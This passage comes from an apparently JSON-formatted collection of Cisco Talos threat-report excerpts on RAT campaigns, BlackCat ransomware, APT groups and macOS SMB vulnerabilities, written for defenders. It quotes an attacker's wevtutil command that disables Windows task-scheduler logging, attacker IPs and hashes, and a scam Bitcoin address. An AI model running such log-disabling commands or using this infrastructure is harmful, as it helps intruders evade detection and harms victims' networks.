Remcos, as well as other threats that are being used in the wild. Remcos is a robust tool that is being actively developed to include new functionality increasing what the attackers can gain access to. To combat this, organizations should continue to be aware of this threat, as well as others like this that may be circulated on the internet. ", "source": "Cisco"}, {"title": "Introduction", "content": "Cisco Talos discovered a malicious campaign in October 2021 delivering variants of Nanocore, Netwire and AsyncRATs targeting user's information.   \nAccording to Cisco Secure product telemetry, the victims of this campaign are primarily distributed across the United States, Italy and Singapore.   \nThe actor used complex obfuscation techniques in the downloader script. Each stage of the deobfuscation process results with the decryption methods for the subsequent stages to finally arrive at the actual malicious downloader method.   \nThe campaign is the latest example of threat actors abusing cloud services like Microsoft Azure and Amazon Web Services and are actively misusing them to achieve their malicious objectives.   \nThe actor is using the DuckDNS dynamic DNS service to change domain names of the C2 hosts. ", "source": "Cisco"}, {"title": "Conclusion", "content": "In this post we have described campaigns demonstrating that threat actors are actively using cloud services in their malicious campaigns. The initial infection vector is primarily a phishing email with a malicious Zip file attachment.Despite being one of the oldest infection vectors, email is still an important infection path which needs to be protected. \nThe ZIP file contains an ISO image file containing a malicious obfuscated downloader. The payloads of these campaigns are instances of Nanocore, Netwire and AsyncRAT remote access trojans. The RAT payloads are using DuckDNS.org dynamic DNS servers so they can regularly change the IP addresses of C2 servers and quickly add new subdomains. \nWe also discovered an obfuscated PowerShell dropper script built by HCrypt builder associated with the download servers of this campaign. \nOrganizations should deploy comprehensive multi-layered security controls to detect similar threats and safeguard their assets. Defenders should monitor traffic to their organization and implement robust rules around the script execution policies on their endpoints. It is even more important for organizations to improve email security to detect and mitigate malicious email messages and break the infection chain as early as possible. ", "source": "Cisco"}, {"title": "Introduction", "content": "Since the beginning of the war in Ukraine, we have observed threat actors using email lures with themes related to the conflict, including humanitarian assistance and various types of fundraising. This activity has been increasing since the end of February. \nThese emails are primarily related to scam activity but have also delivered a variety of threats, including remote access trojans (RATs). This is in addition to the malicious activity we've recently seen related to the crowd-sourced attacks in the region. \nThis pattern is consistent with what we typically see following global events or crises, such as the COVID-19 pandemic, when opportunistic cybercriminals attempt to exploit high public interest for their own gain. ", "source": "Cisco"}, {"title": "Detection", "content": "As is common with Remcos, the sample achieves persistence via setting a registry run key and attempts to establish C2 communications with an attacker-controlled DDNS server. \nIn another example, the email purports to be associated with a humanitarian effort to provide assistance to refugees. The email itself was spoofed to appear as if it was from a legitimate Ukrainian government source. In addition to providing a Bitcoin wallet address for recipients to send donations to, the email also includes an Office document attachment. \nA donation campaign has been launchedto support Ukrain and also help refugeesfleeingthe conflict in Ukraine The campaign, organized by the humanitarian organization Act for Peace, is hopingto raise \\$9,oo0,0 to support refugeesintheregion \nStand with the people of Ukraine. Now accepting cryptocurrency donations. Bitcoin, Ethereum, UsDT and NFT \nBTC - bc1q2vhvvarun3d8u40s7uuml2m07lp90k62y84eg4 \nBest Regards Ukraine #BeautifulUkraine ", "source": "Cisco"}, {"title": "Conclusion", "content": "The global interest in the ongoing war in Ukraine makes it a convenient and effective news event for cybercriminals to exploit. Cisco Talos saw the same type of activity when the COVID-19 pandemic started and we are now seeing it with Ukraine. Criminals, especially cybercriminals, are opportunistic. If a certain topic of lure is going to increase the chances of a potential victim installing their payload, they will use it. \nWe expect this type of behavior to continue and likely increase in the days and weeks ahead. As this conflict wears on, an increasing number of criminals are going to try and exploit it. We've already seen a huge amount of scam activity in addition to malware delivery via traditional means like email. This particular conflict is unique in that a vigilante cyber army is conducting attacks using software they don't understand, something else we've found abused. \nOrganizations need to be working to detect this type of activity in your environment. While there may be protections in place to stop the malware attacks from occurring, the risk of scams is significant and can be difficult to block, especially in the case of BEC, where trusted accounts are sending malicious emails. One way to address this is hunting in your own telemetry, if applicable, to try and find these threats as they are occurring. We recommend building a word list to search on, making sure to include cyrillic versions in both Ukrainian and Russian, as they are also being widely targeted by attackers. \nCoverage \nWays our customers can detect and block this threat are listed below. \nCisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free here. \nCisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in these attacks. \nCisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign. You can try Secure Email for free here. \nCisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat Defense Virtual, Adaptive Security Appliance and Meraki MX can detect malicious activity associated with this threat. \nCisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products. \nUmbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella here. \nCisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites before users access them. \nAdditional protections with context to your specific environment and threat data are available from the Firewall Management Center. \nCisco Duo provides multi-factor authentication for users to ensure only those authorized are accessing your network. \nOpen-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. \nIndicators of Compromise (IOC) \nThe following indicators of compromise have been observed to be associated with these malware campaigns. \nHashes (SHA256) \n0a9babd846b1edf99e75f3c9de492c6341f9ca9a8e91851ad323bf8f325f9799   \n19b3fb26c3ede42cf8f5922fa4e10da1004a820e3f94dd25615d387092b996ed   \n1d7b8253666eb3d60b84a82999d6a9f393fee01876ff6f39dee4bdf304a11bfd   \n4907309437e12932d437f8c3ae03fbfde7d4e196b6f1dc7f2d98e3a388ce585c ", "source": "Cisco"}, {"title": "Introduction", "content": "Cisco Talos has identified a new wave of what is believed to be an ongoing campaign using the Delphi malware since 2017. Talos believes with high confidence that this is the work of the Arid Viper threat actor. This is a group believed to be based out of Gaza that's known to target organizations all over the world. The actor uses the Micropsia implant in the most recent wave that started around October 2021. \nThis actor uses their Delphi-based Micropsia implant to target Palestinian individuals and organizations, using politically themed file names and decoy documents. The most recent wave uses content originally published on the Turkish state-run news agency Anadolu and on the Palestinian MA'AN development center to target activists and Palestinian institutions. The tactics, techniques and procedures (TTPs) used in the most recent samples found by Talos lead us to believe this is a campaign linked to the previous campaign we reported on in 2017. Meta exposed this actor in an April 2021 report that focused mainly on mobile targeting operations. However, that did not stop the group, as they've continued to target Windows-based systems. Although this group hasn't technologically evolved, it has the motivation and means to operate longstanding campaigns against the same targets. This level of motivation makes them particularly dangerous to organizations that may come into their crosshairs. An in-depth defense using protections against the several layers of their infection chain is the best strategy to defend against this kind of threat. This should include email security to detect and prevent their most common initial attack vector, along with Cisco Secure Endpoint if the implant is successfully delivered using novel attack vectors. On the network side, Cisco Secure Firewall and Umbrella can be used to detect command and control (C2) communications performed with new versions and variants of their implants. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Since its initial disclosure by Talos in 2017, this campaign from Arid Viper has become a longstanding offensive cyber attack spanning well into 2021. \nState-sponsored actors and privateer groups rely heavily on stealth in their operations. The public disclosures of campaigns and targeted attacks are usually followed by the actors taking down their infrastructure and revamping their implants to avoid discovery of their malicious assets. \nHowever, in the case of Arid Viper, the continued use of the same TTPs over the past four years indicates that the group doesn't feel affected by the public exposure of its campaigns and implants, and continues to operate business as usual. This complete lack of deterrence makes them a dangerous group once they decide to target an organization or individual. \nThe lack of change also points to a certain level of success with their current TTPs. The new campaign and accompanying versions of Arid Viper's Micropsia implant disclosed in this research by Talos brings the spotlight back to their politically themed campaign to remind potential victims that the group is still very active. \nArid Viper is a prime example of groups that aren't very advanced technologically, however, with specific motivations, are becoming more dangerous as they evolve over time and test their tools and procedures on their targets. Implants such as Micropsia come in various forms such as Delphi, Python and Android. Such RATs proliferated and operated by a highly motivated threat actor who refuses to back down, consist of a variety of functionalities and are constantly evolving. These RATs can be used to establish long-term access into victim environments and additionally deploy more malware purposed for espionage and stealing information and credentials. \nIn-depth defense strategies based on a risk analysis approach can deliver the best results in the prevention. However, this should always be complemented by a good incident response plan which has been not only tested with tabletop exercises, but also reviewed and improved every time it is put to the test on real-world engagements. \nCoverage \nWays our customers can detect and block this threat are listed below. \nCisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free here. \nCisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in these attacks. \nCisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign. You can try Secure Email for free here. \nCisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat Defense Virtual, Adaptive Security Appliance and Meraki MX can detect malicious activity associated with this threat. \nCisco Secure Network/Cloud Analytics (Stealthwatch/Stealthwatch Cloud) analyzes network traffic automatically and alerts users of potentially unwanted activity on every connected device. \nCisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products. \nUmbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella here. \nCisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites before users access them. \nAdditional protections with context to your specific environment and threat data are available from the Firewall Management Center. \nCisco Duo provides multi-factor authentication for users to ensure only those authorized are accessing your network. \nOpen-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. \nIOCS ", "source": "Cisco"}, {"title": "Introduction", "content": "By Tiago Pereira, Caitlin Huey \nTHURSDAY, MARCH 17, 2022 07:58 \nTHREAT SPOTLIGHT RANSOMWARE\nBlackCat is a recent and growing ransomware-as-a-service (RaaS) group that targeted several organizations worldwide over the past few months. \nThere are rumors of a relationship between BlackCat and the BlackMatter/DarkSide ransomware groups, infamous for attacking the Colonial Pipeline last year. According to a BlackCat representative, BlackCat is not a rebranding of BlackMatter, but its team is made from affiliates of other RaaS groups (including BlackMatter).   \nTalos has observed at least one attacker that used BlackMatter was likely one of the early adopters of BlackCat. In this post, we'll describe these attacks and the relationship between them.   \nUnderstanding the techniques and tools used by RaaS affiliates helps organizations detect and prevent attacks before the ransomware itself is executed, at which point, every second means lost data. ", "source": "Cisco"}, {"title": "defense", "content": "During the BlackCat attack, logs were disabled on several systems to avoid detection. For example, before setting up the reverse-ssh scheduled task tool attackers disabled logs for the task scheduler (a full list of disabled logs is provided in the IOC section below). \nc:\\windows\\system32\\wevtutil.exe set-log microsoft-windows-taskscheduler/operational /enabled:false \nThe anti-rootkit tool Gmer was loaded into a small number of key systems. We believe the attackers used this to disable endpoint protection. \nc:\\users\\<username>\\downloads\\gmer\\gmer.exe ", "source": "Cisco"}, {"title": "Conclusion", "content": "BlackCat first surfaced in November 2021, with the attack we described here taking place in December 2021. While we don't know how related BlackCat is to BlackMatter, we assess with moderate confidence that based on the tools and techniques of these attacks and overlapping infrastructure, BlackMatter affiliates were likely among the early adopters of BlackCat. \nAs we have seen several times before, RaaS services come and go. Their affiliates, however, are likely to simply move on to a new service. And with them, many of the TTPs are likely to persist. \nOne key aspect of these attacks is that adversaries take time exploring the environment and preparing it for a successful and broad attack before launching the ransomware, at which point every second means lost data. Therefore, it is key that the attack is detected in its early stages. \nThe two attacks described here took over 15 days to reach the encryption stage. Knowing the attackers tools and techniques and having monitoring and response processes in place could have prevented the successful encryption of the companies files. \nTalos will continue to monitor RaaS and their affiliates activities and provide intelligence, detection rules and indicators to help defenders as they work to protect their networks. \nIOCs \nDOMAINS - COMMON:   \nwindows[.]menu   \nIP'S - COMMON:   \n52.149.228[.]45   \n20.46.245[.]56   \nHASHES - COMMON:   \nApply.ps1   \nD97088F9795F278BB6B732D57F42CBD725A6139AFE13E31AE832A5C947099676   \ndefender.vbs   \nB54DD21019AD75047CE74FE0A0E608F56769933556AED22D25F4F8B01EE0DA15   \nHASHES - BLACKCAT:   \nReverse-ssh (compiled with hardcoded domain):   \n47AFFAED55D85E1EBE29CF6784DA7E9CDBD86020DF8B2E9162A0B1A67F092DCD   \nstealer:   \n65DBAFE9963CB15CE3406DE50E007408DE7D12C98668DE5DA10386693AA6CD73   \nBlackcat ransomware:   \n060CA3F63F38B7804420729CDE3FC30D126C2A0FFC0104B8E698F78EDAB96767   \nHASHES - BLACKMATTER:   \nBlackMatter ransomware:   \n706F3EEC328E91FF7F66C8F0A2FB9B556325C153A329A2062DC85879C540839D   \nCoverage \nWays our customers can detect and block this threat are listed below. \nCisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free here. \nCisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat Defense Virtual, Adaptive Security Appliance and Meraki MX can detect malicious activity associated with this threat. \nCisco Secure Network/Cloud Analytics (Stealthwatch/Stealthwatch Cloud) analyzes network traffic automatically and alerts users of potentially unwanted activity on every connected device. \nCisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products. \nUmbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella here. \nAdditional protections with context to your specific environment and threat data are available from the Firewall Management Center. \nOpen-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Edmund Brumaghin, Paul Rascagneres \nWEDNESDAY, JANUARY 30, 2019 14:19\nTHREAT SPOTLIGHT\nEdmund Brumaghin and Paul Rascagneres authored this post, with contributions from Jungsoo An. \nExecutive summary https://blog.talosintelligence.com/fake-korean-job-posting/ \nCisco Talos recently observed a targeted malware campaign being leveraged in an attempt to compromise specific organizations. The infection vector associated with this campaign was a Microsoft Word document that was disguised as a job posting for Cisco Korea, and leveraged legitimate content available as part of job postings on various websites. EST Security also described this campaign in a blog post this week. This malicious Office document appears to have been the initial portion of what was designed to be a multi-stage infection process. \nDuring our analysis of this campaign, we located additional samples that we believe are linked to multiple previous campaigns associated with the same threat actor. Each of the campaigns leveraged malicious documents and initial stage payloads that all featured similar tactics, techniques, and procedures (TTP). Due to the targeted nature of this campaign, the lack of widespread indicator of compromise data, and the apparent nature of the targeting, this appears to be associated with a sophisticated attacker. This sort of attack has become more common as threat actors continue to target users to gain an initial foothold in environments. Organizations are encouraged to employ a defense-in-depth approach to security and disallow the execution of macros where possible. ", "source": "Cisco"}, {"title": "Conclusion", "content": "These campaigns demonstrate the increasingly sophisticated nature of attacks that are being leveraged by threat actors attempting to compromise organizations around the world. In this most recent campaign, the attackers took the content of legitimate job postings and used that in an attempt to add legitimacy to the malicious Office documents being delivered to potential victims. The use of the same TTPs across multiple campaigns over a long period demonstrates that this threat actor has been operational for years, and is continuing to operate to achieve their mission objectives. Cisco Talos continues to monitor the global threat landscape to ensure that customers remain protected from these as well as additional attacks that may be observed in the future. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Chetan Raghuprasad \nWEDNESDAY, MAY 11, 2022 08:00\nTHREAT SPOTLIGHT\nCisco Talos has observed an ongoing malicious campaign since August 2021 from the Bitter APT group that appears to target users in Bangladesh, a change from the attackers' usual victims. \nAs part of this, there's a new trojan based on Apost Talos is calling \"ZxxZ,\" that, among other features, includes remote file execution capability. \nBased on the similarities between the C2 server in this campaign with that of Bitter's previous campaign, we assess with moderate confidence that this campaign is operated by the Bitter APT group. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Organizations should be vigilant about the highly motivated threat actors who are known to conduct targeted attacks in their region. Threat actors usually emerge with smart techniques to accomplish their adversarial objectives and we have seen such an attempt in this campaign with the addition of a new variant to their arsenal. \nIn this current campaign, upon compromising the victim's machine and implanting the trojan ZxxZ - which has remote file execution capability - the adversary can deploy and run other tools from their arsenal to achieve their malicious objective. \nOrganizations should have a layered defense strategy with the implementation of the latest detection rules and behavioral protections in their endpoint defense solutions - not only with technical controls, but the organizations should have matured incident response plans and have the organization's security posture streamlined to protect their environment against the latest threats. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Jonathan Munshaw \nWEDNESDAY, JUNE 2, 2021 09:13\nSECUREX \nBy Aleksandar Nikolich. \nExecutive summary https://blog.talosintelligence.com/vuln-spotlight-smb-mac-deep-dive/ \nCisco Talos recently discovered multiple vulnerabilities in macOS's implementation of SMB server. An adversary could exploit these vulnerabilities to carry out a variety of malicious actions, including revealing sensitive information on the server, bypassing certain cryptographic checks, causing a denial of service or execute remote code on the targeted server. Cisco Talos worked with Apple to ensure that these issues are resolved and an update is available for affected customers, all in adherence to Cisco's vulnerability disclosure policy. Users are encouraged to update to the latest macOS version as soon as possible to patch these vulnerabilities. ", "source": "Cisco"}, {"title": "Background", "content": "SMB is among the most ubiquitous network protocols encountered in enterprise environments. It facilitates, among other things, basic file-sharing among workstations. Historically, it's been a major security pain point, as some implementations contained high-severity vulnerabilities, such as EternalBlue. \nThe open-source Samba project provides support for SMB on non-Windows operating systems. This included old versions of Apple's OS X. However, in 2011, the Samba project changed its license to GPL which made it incompatible with OS X. This prompted Apple to develop its own implementation dubbed \"SmbX,\" which has been included in every version of OS X and macOS ever since. \nSmbX is a proprietary implementation of a protocol that has led to some well-known vulnerabilities. This makes it a very interesting target, especially with the growing presence of macOS machines in today's network environments. We recently discovered several new vulnerabilities in macOS' implementation of SMB. They are all on the post-authentication attack surface, which lowers their severity, but they are readily exploitable in environments with advanced authentication mechanisms. ", "source": "Cisco"}, {"title": "IOC", "content": "While processing the IOCTL_REQUEST packets, function smb2_dispatch_ioctl_request is invoked with supplied packet bytes as its arguments. In turn, it calls smb2::extract(uchar \\*&,uchar \\* const&,smb2::ioctl_request &,uchar \\* const&) which extracts different fields from the packet into IOCTL_REQUEST structure. \nA code path exists in \"smb2::extract\" that can leave a stack buffer uninitialized while still succeeding. This pointer actually resides on the calling function's stack, is uninitialized and contains random data. When it is subsequently used, it can lead to a crash or further memory corruption if contents can be controlled. \nUninitialized stack variables are rarely exploitable, so to demonstrate control over the uninitialized stack area, the attached PoC constructs a special, compound, SMB command. To control the stack contents, we need to find a function that gives us control of its own stack. A prime candidate for this is the smb2_dispatch_tree_connect function, which is perfect for this task because it has a large stack frame and directly copies packet data onto its stack. Different SMB messages in a compound SMB message are processed in the same thread, meaning the stack memory initialized by \"TREE_CONNECT\" will subsequently be utilized by \"IOCTL_REQUEST\" and we can therefore achieve control of the uninitialized variable. ", "source": "Cisco"}, {"title": "Conclusion", "content": "When targeting stateful protocols such as SMB, it is very important to, at least vaguely, identify and understand the state graph. This graph shows which states are only reachable from certain other states. This might require extensive reverse engineering if the protocol specification is unknown or the implementation doesn't strictly adhere to the specs. Then, it becomes very effective to fuzz certain states by first satisfying the pre-conditions. \nIn this case, we started fuzzing in different states and targeted the next state transition, one at a time, until we tested all the code we wanted to look at. The next step in this research would be to construct a way to effectively fuzz multiple steps in the same SMB connection. This goes beyond code coverage and leads to more complex states that would surely uncover deeper vulnerabilities. \nAnother takeaway would be to identify fuzzer blockers and chokepoints early on by analyzing the code that is being tested. This, plus patching or avoiding known crashes, often leads to harder-toreach vulnerabilities. Both can be achieved by either fixing generated fuzz test cases after mutation or by employing more structure-aware generators in the first place. \nCoverage \nThe following SNORT\u24c7 rules will detect exploitation attempts against this vulnerability: 57115 - 57118, 57136, 57232, 57265, 57282, 57310 and 57340. Additional rules may be released in the future and current rules are subject to change, pending additional vulnerability information. For the most current rule information, please refer to your Firepower Management Center or Snort.org. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Guilherme Venere \nTHURSDAY, JANUARY 19, 2023 08:00 \nAdversaries' shift toward Shell Link (LNK) files, likely sparked by Microsoft's decision to block macros, provides the opportunity to capitalize on information that can be provided by LNK metadata.   \nCisco Talos analyzed metadata in LNK files and correlated it with threat actors tactics techniques and procedures, to identify and track threat actor activity. This report outlines our research on Qakbot and Gamaredon as examples. \nTalos also used LNK file metadata to identify relationships among different threat actors. In this report we demonstrate this by using metadata to connect  Bumblebee with IcedID and Qakbot respectively. ", "source": "Cisco"}, {"title": "Conclusion", "content": "In the cyber threat landscape, any new information on the adversary could be critical toward improving defenses.  In this blog Talos demonstrated metadata's value using LNK files, but the same concept is applicable to other file formats that include metadata, or attack tools that leave signature traces about their use in their payloads. \nBy analyzing and tracking information leaked through metadata, and correlating this information with other actor's tactics, techniques and procedures, defenders can develop better detections and even predict future behavior, to prepare for an attack. \nCoverage \nCisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free here. \nCisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in these attacks. \nCisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign. You can try Secure Email for free here. \nCisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat Defense Virtual, Adaptive Security Appliance and Meraki MX can detect malicious activity associated with this threat. \nCisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products. \nUmbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella here. \nCisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites before users access them. \nAdditional protections with context to your specific environment and threat data are available from the Firewall Management Center. \nCisco Duo provides multi-factor authentication for users to ensure only those authorized are accessing your network. \nOpen-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. Snort SIDs for this threat are: 61099-61102, 300367-300368 \nThe following ClamAV detections are also available for this threat: \nLnk.Dropper.Agent Lnk.Trojan.Qakbot Lnk.Trojan.BazarLoader Lnk.Downloader.Agent Win.Dropper.Agent ", "source": "Cisco"}, {"title": "Introduction", "content": "By Asheer Malhotra \nTHURSDAY, SEPTEMBER 23, 2021 08:01 \nCisco Talos is tracking a campaign targeting government personnel in India using themes and tactics similar to APT36 (aka Mythic Leopard and Transparent Tribe).   \nThis campaign distributes malicious documents and archives to deliver the Netwire and Warzone (AveMaria) RATs.   \nThe lures used in this campaign are predominantly themed around operational documents and guides such as those pertaining to the \"Kavach\" (hindi for \"armor\") two-factor   \nauthentication (2FA) application operated by India's National Informatics Centre (NIC). This campaign utilizes compromised websites and fake domains to host malicious payloads, another tactic similar to Transparent Tribe. \nWhat's new? \nCisco Talos recently discovered a malicious campaign targeting government employees and military personnel in the Indian sub-continent with two commercial and commodity RAT families known as NetwireRAT (aka NetwireRC) and WarzoneRAT (aka Ave Maria). The attackers delivered a variety of lures to their targets, predominantly posing as guides related to Indian governmental infrastructure and operations such as Kavach and I.T.-related guides in the form of malicious Microsoft Office documents (maldocs) and archives (RARs, ZIPs) containing loaders for the RATs. \nApart from artifacts involved in the infection chains, we've also discovered the use of server-side scripts to carry out operational tasks such as sending out malicious emails and maintaining presence on compromised sites via web shells. This provides additional insight into the attacker's operational TTPs. \nSome of these lures and tactics utilized by the attackers bear a strong resemblance to the Transparent Tribe and SideCopy APT groups, including the use of compromised websites and fake domains. \nHow did it work? \nThis campaign uses a few distinct, yet simple, infection chains. Most infections use a maldoc that downloads and instruments a loader. The loader is responsible for downloading or decrypting (if embedded) the final RAT payload and deploying it on the infected endpoint. In some cases, we've observed the use of malicious archives containing a combination of maldocs, loaders and decoy images. The RAT payloads are relatively unmodified, with the command and control (C2) IPs and domains being the most pivotal configuration information. \nThis campaign illustrates another instance of a highly motivated threat actor using a set of commercial and commodity RAT families to infect their victims. These RATs are packed with many features out-of-the-box to achieve comprehensive control over the infected systems. It is also highly likely that these malware families establish footholds into the victim's networks to deploy additional plugins and modules. ", "source": "Cisco"}, {"title": "Conclusion", "content": "This campaign has been ongoing since the end of 2020 and continues to operate today. The attackers initially deployed Netwire and Warzone RATs on the infected endpoints. The use of these RATs benefits an adversary twofold - it makes attribution difficult and saves the effort to create bespoke implants. Beginning in July 2021, however, we observed the deployment of the file enumerators alongside the RATs. This indicates that the attackers are expanding their malware arsenal to target their victims: military and government personnel in India. \nhttps://blog.talosintelligence.com/operation-armor-piercer/ \nInfection tactics including government-themed lures, deployment of commodity/commercial RATs and file enumerators and the use of compromised and attacker-owned domains indicates a strong resemblance to SideCopy and Transparent Tribe. \nUnlike many crimeware and APT attacks, this campaign uses relatively simple, straightforward infection chains. The attackers have not developed bespoke malware or infrastructure management scripts to carry out their attacks, but the use of prebaked artifacts doesn't diminish the lethality of these attacks. In fact, ready-made artifacts such as commodity or cracked RATs and mailers allow the attackers to rapidly operationalize new campaigns while focusing on their key tactic: tricking victims into infecting themselves. \nCoverage \nWays our customers can detect and block this threat are listed below. \nCisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free here. \nCisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in these attacks. \nCisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign. You can try Secure Email for free here. \nCisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat Defense Virtual, Adaptive Security Appliance and Meraki MX can detect malicious activity associated with this threat. \nCisco Secure Network/Cloud Analytics (Stealthwatch/Stealthwatch Cloud) analyzes network traffic automatically and alerts users of potentially unwanted activity on every connected device. \nCisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products. \nUmbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella here. \nCisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites before users access them. \nAdditional protections with context to your specific environment and threat data are available from the Firewall Management Center. \nCisco Duo provides multi-factor authentication for users to ensure only those authorized are accessing your network. \nOpen-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Jonathan Munshaw \nTHURSDAY, OCTOBER 15, 2020 08:50 \nBy Matthew Olney and the communications and public relations professionals at Cisco. \nEditor's Note: For more on this topic, sign up for a Cisco Duo webinar on election security on Oct. 15 at 1 p.m. ET here. \nIn our work with our partners in the election security space, the most difficult question we've been asked is \"What do we do about disinformation campaigns?\" This isn't something Talos usually specializes in, as it's not a true technical security problem. However, one of the great benefits of working at Cisco is the incredible breadth of capability of our coworkers and partners. So, correctly framing the question as a communications issue, we worked with Cisco communications professionals and our outside communications partners to put together an outline of a communications plan for elections officials facing disinformation campaigns. \nTo help the reader understand why we're making the recommendations we are, we will summarize here the findings of our previous reports on elections security and disinformation. In short, we have found that while one of the goals of foreign adversaries may be to favor a particular candidate, the primary objective of both disinformation campaigns and election interference up to this point is to aggravate existing social, cultural and political divisions and sow doubt about the fairness and integrity of Western democracies. The driving goal here is to weaken the United States and other global democratic powers to allow foreign adversaries to more easily achieve their geopolitical objectives. Here's a similar set of recommendations specifically for voters.Understanding these are the objectives of our adversaries, we are left to make an unfair ask of elections officials: In the face of a flood of disinformation coming from both foreign and domestic actors and while rearchitecting how we vote in the face of a pandemic, protect our democracy while the rest of the nation is distracted by one of the most contentious elections in memory. This means not just running a free and fair election, but also working and communicating in a way that reassures a deeply divided and suspicious nation that the systems we have in place will reflect the will of the people and will not be corrupted. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Ultimately, countering a disinformation campaign is a challenge that requires preparation far in advance. We already see these recommendations in use by much of the election community, with excellent communications paths, education campaigns and fact-based information being passed to the public. Our hope is by putting all these recommendations in one place, even election officials operating on their own without the full support of a professional communications team can use them to offset the impact of disinformation campaigns. \nTeaching your audience where to find official information, always messaging your dedication to free and fair elections and appropriately responding to disinformation as it comes out is a lot of work, but in today's environment, it is one of the most important jobs that elections officials do. While almost everyone focuses on who is going to win the contest, election officials across the country focus on the integrity and fairness of the contest. That fact, more than any other, is a critical one to communicate to the country. \nSHARE THIS POST ", "source": "Cisco"}, {"title": "Introduction", "content": "B Warren Mercer \nTHURSDAY, MAY 31, 2018 19:00 \nThis blog post is authored by Warren Mercer and Paul Rascagneres with contributions from Jungsoo An. \nExecutive Summary   \nTalos has discovered a new malicious Hangul Word Processor (HWP) document targeting Korean users. If a malicious document is opened, a remote access trojan that we're calling \"NavRAT\" is downloaded, which can perform various actions on the victim machine, including command execution, and has keylogging capabilities. \nThe decoy document is named \"\ubbf8\ubd81 \uc815\uc0c1\ud68c\ub2f4 \uc804\ub9dd \ubc0f \ub300\ube44.hwp\" (Prospects for US-North Korea Summit.hwp). The HWP file format is mainly used in South Korea. An Encapsulated PostScript (EPS) object is embedded within the document in order to execute malicious shellcode on the victim systems. The purpose is to download and execute an additional payload hosted on a compromised website: NavRAT. \nThis is a classic RAT that can download, upload, execute commands on the victim host and, finally, perform keylogging. However, the command and control (C2) infrastructure is very specific. It uses the legitimate Naver email platform in order to communicate with the attackers via email. The uploaded file(s) are sent by email, and the downloaded files are retrieved from an email attachment. We have already observed malware using free email platforms for abuse, but this is the first time we have identified a malware that uses Naver - which is known for its popularity in South Korea. \nOne of the most interesting questions we still have is regarding attribution - and who is behind this malware. Previously, we published several articles concerning Group123 (here, here, here, here and here). We currently assess with medium confidence that this campaign and NavRAT are linked to Group123. ", "source": "Cisco"}, {"title": "Conclusion", "content": "South Korea is still, and always will remain, an attractive target for advanced actors. The region has geopolitical interests that arise from the segregations that exist between the secretive North Korea and the more open South Korea. In this campaign, the attackers used a classical HWP document in order to download and execute a previously unknown malware: NavRAT. The author used real events in order to forge the decoy document. It chose the U.S. - North Korea Summit to entice the targets to open it. \nThe approach is close to the techniques used by Group123 attacks we have observed and written about over the past 18 months or so: the shellcode contains similarities, the final payload is malicious shellcode located in an image hosted on a compromised website, and the author uses an open platform as the C2 server. In this case, NavRAT used an email provider: Naver, while ROKRAT previously used cloud providers. And finally, the victimology and the targeted region are the same. All these elements are not strict proof of a link between NavRAT and ROKRAT. However, we asses with medium confidence that NavRAT is linked to Group123. \nUsing well-known local cloud/email providers is smart from 